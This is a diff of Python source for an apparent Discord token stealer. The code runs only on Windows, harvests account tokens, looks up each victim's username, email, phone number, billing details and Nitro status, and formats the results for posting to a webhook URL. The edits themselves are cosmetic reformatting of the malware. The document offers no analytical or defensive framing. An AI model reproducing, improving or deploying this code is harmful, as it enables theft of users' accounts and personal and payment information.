@@ -1,13 +1,10 @@
 WEBHOOK_URL = ''
 
-import os
+import os, json, re, urllib3, random
 if os.name != "nt": exit()
-import json
-import re
-import urllib3
+
 from urllib.request import Request, urlopen
 from requests import post, get
-import random
 from datetime import datetime
 
 user_agents = ['Mozilla/5.0 (X11; Linux i686; rv:7.0) Gecko/20150626 Firefox/36.0',
@@ -66,8 +63,6 @@ def GetTokens():
         if len(tokens) > 0:
             grabbed[platform] = tokens
     return grabbed
-
-
 
 def GetUsername(token):
     headers = {
@@ -207,15 +202,15 @@ def SendTokens(webhook_url, tokens_grabbed = None):
     
     for token in tokens_info:
         
-        username = GetUsername(token)
-        user_id = GetUserId(token)
-        email = GetEmail(token)
-        phone_number = GetPhoneNumber(token)
+        username       = GetUsername(token)
+        user_id        = GetUserId(token)
+        email          = GetEmail(token)
+        phone_number   = GetPhoneNumber(token)
         verified_check = VerifiedCheck(token)
-        billing = BillingCheck(token)
-        nitro = NitroCheck(token)[0]
-        locale = GetLocale(token)[0]
-        language = GetLocale(token)[1]
+        billing        = BillingCheck(token)
+        nitro          = NitroCheck(token)[0]
+        locale         = GetLocale(token)[0]
+        language       = GetLocale(token)[1]
         
 
         embed[0]['description'] += f'\n```diff\n+ Token Info for\n{token}\n\n'
@@ -227,11 +222,12 @@ Email      = {email}
 Phone      = {phone_number}
 Verified   = {verified_check}
 Billing    = {billing}
-Nitro      = {nitro}'''
+Nitro      = {nitro}
+'''
 
         if nitro == True:
-            nitrostart = NitroCheck(token)[1]
-            nitroend = NitroCheck(token)[2]
+            nitrostart  = NitroCheck(token)[1]
+            nitroend    = NitroCheck(token)[2]
             daysofnitro = NitroCheck(token)[3]
             embed[0]['description'] += f'\n\nNitro Started = {nitrostart}\nNitro Ends = {nitroend}\nDays Left = {daysofnitro}\n\n'
 
